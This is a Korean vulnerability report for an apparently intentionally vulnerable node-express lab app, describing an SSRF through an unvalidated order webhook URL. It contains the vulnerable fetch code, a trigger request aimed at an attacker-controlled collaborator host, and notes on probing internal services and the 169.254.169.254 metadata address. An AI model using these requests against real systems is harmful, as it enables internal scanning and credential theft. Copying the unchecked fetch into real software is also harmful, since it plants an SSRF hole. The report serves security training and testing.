# VULN-004 SSRF via order webhook URL

- 대상 스택: node-express
- 심각도: High
- 분류: A10:2021 Server-Side Request Forgery (SSRF)

## 위치

`apps/node-express/src/routes/orders.js` — `POST /api/orders`가 요청 바디의 `webhookUrl`을 검증 없이 `orders.webhook_url`에 저장하고, 결제 확인(`POST /api/orders/:id/confirm`) 성공 시 `fireWebhook()`이 그 URL로 서버가 직접 `fetch()`를 호출한다.

```js
async function fireWebhook(webhookUrl, payload) {
  if (!webhookUrl) return;
  try {
    await fetch(webhookUrl, { method: 'POST', ... });
  } catch (err) { ... }
}
```

URL 스킴/호스트에 대한 allowlist가 전혀 없다 — `http://169.254.169.254/...` 같은 내부망·메타데이터 주소도 그대로 요청한다.

이 UI 필드(Cart 페이지의 "Order webhook URL")는 사용성 문제로 제거했지만, `POST /api/orders`가 여전히 `webhookUrl` 바디 필드를 그대로 받으므로 Burp Repeater 등으로 직접 요청을 조작하면 동일하게 재현 가능하다 (VULN-001의 검색 필드처럼 UI 위젯 존재 여부와 무관한 API 레벨 취약점).

## 트리거 방법

```
POST /api/orders
{"items":[{"productId":1,"quantity":1}],"webhookUrl":"http://<attacker-controlled-collaborator-host>/"}
```

주문 생성 후 `POST /api/orders/:id/confirm`으로 결제를 확인시키면(테스트 결제 완료), 서버가 `webhookUrl`로 아웃바운드 POST 요청을 보낸다 — Burp Collaborator로 수신 확인 가능. 내부 서비스(예: 같은 Docker 네트워크의 다른 컨테이너 IP:포트)를 대상으로 지정하면 포트 스캔/내부 서비스 프로빙에도 사용 가능.

## 영향

- 서버를 프록시 삼아 임의의 내부/외부 호스트로 아웃바운드 요청 발생 (Collaborator를 통한 존재 증명, 내부망 스캐닝, 클라우드 메타데이터 엔드포인트 접근 시도 등).
- 5초 타임아웃(`AbortSignal.timeout(5000)`) 외에는 아무 제약이 없다.

## 증거 (재현 확인)

2026-08-25, 로컬 재현: `webhookUrl`을 `http://localhost:3000/api/session`(자기 자신의 다른 엔드포인트)으로 지정 후 주문 확인 → 서버 로그에 아웃바운드 요청이 실제로 발생함을 확인 (요청 실패 시에도 `console.error`로 델리버리 시도 자체는 로그에 남음).

## 조치 상태: 미조치 (의도된 취약점 — 조치하지 않음)
